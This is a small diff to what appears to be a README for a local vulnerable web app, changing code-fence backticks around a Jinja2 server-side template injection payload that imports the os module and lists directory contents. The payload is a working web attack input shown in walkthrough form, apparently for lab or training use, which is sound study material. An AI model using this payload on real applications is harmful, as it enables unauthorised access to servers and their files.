@@ -23,9 +23,9 @@ Please visit localhost:5000
 
 First, you can check directory like this:
 
-``
+```
 {{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').listdir('./')}}
-``
+```
 
 and like this:
 
